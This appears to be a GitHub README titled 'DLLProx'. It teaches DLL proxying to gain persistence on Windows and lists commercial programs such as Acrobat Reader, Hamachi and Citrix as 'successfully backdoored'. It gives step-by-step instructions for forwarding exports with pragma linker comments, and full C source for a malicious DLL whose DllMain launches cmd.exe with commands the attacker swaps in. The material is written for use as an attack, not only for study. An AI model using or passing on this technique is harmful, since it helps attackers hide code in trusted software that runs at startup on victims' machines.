# DLLProx
DLL Proxying techniques, and more

## List of successfully backdoored programs (so far) :

                             5
        +-------------------------------------------+
        |       NAME         |         DLL          |
        |-------------------------------------------|
        | Lightshot.exe      | DXGIODScreenshot.dll |  (Lightshot)
        | AcroRd32.exe       | BIB.dll              |  (Acrobat Reader)
        | LMIGuardianSvc.exe | LMIGuardianDll.dll   |  (Hamachi service)
        | ManyCam.exe        | P7x32.dll            |  (ManyCam)
        | concentr.exe       | ctxmui.dll           |  (Citrix)
        +-------------------------------------------+


## DLL Proxying & Persistence concept :
The goal is to use programs that automatically run on startup.

There are two techniques, generally if the first one fails you will want to try the other one.

The two common steps for both techniques are :
1. Find the program that fits your needs for persistence
2. List DLLs used by this program (with Procmon)

### **Technique 1**

  Technique 1 is based on the idea that the DLL exists, and is loaded by the program. 

In Procmon, you can check this with the "*Result*" column being set to "*SUCCESS*".

3. Once you picked your working DLL, use a tool such as DLLExportViewer to export the legit DLL's functions 

(or use my script to automate this step and step 4)

4. Generate the pragma comment linkers for you to implement into your malicious DLL
It should look like :

    #pragma comment(linker,"/export:LegitDLLFunctionName=DLLFileName_orig.LegitDLLFunctionName,@ordinalNumber")

5. Create your DLL with the code that you want to execute, here's an example :

```C
#pragma once

// Add the generated comments here
// # pragma comment(linker,"/export:LegitDLLFunctionName=DLLFileName_orig.LegitDLLFunctionName,@ordinalNumber")
// .....
#include <stdio.h>
#include <string.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <atlstr.h>
#include <Windows.h>

DWORD WINAPI payload() {
	STARTUPINFOA info = { 0 };

	PROCESS_INFORMATION processInfo = { 0 };

	LPSTR arguments = (char*)" /c notepad"; // This is not necessary. It's just an argument example for you to use with your own commands

	if (CreateProcessA("C:\\Windows\\System32\\cmd.exe", arguments, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo)) {
		WaitForSingleObject(processInfo.hProcess, INFINITE);
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
	}
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		payload();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```

6. Name your DLL with the original legitimate DLL name (without the \_orig), and place it in the same folder.
7. Start the program and see if it worked.



## Consequences

Now everytime the program is going to run, assuming you have chosen a correct DLL and that your own DLL is working, it is going to call your malicious DLL, and will continue to owrk since your DLL exports all the same functions that the legit DLL exports.

Since it is a program that is ran on startup, your DLL will be called on startup and persistence is achieved.
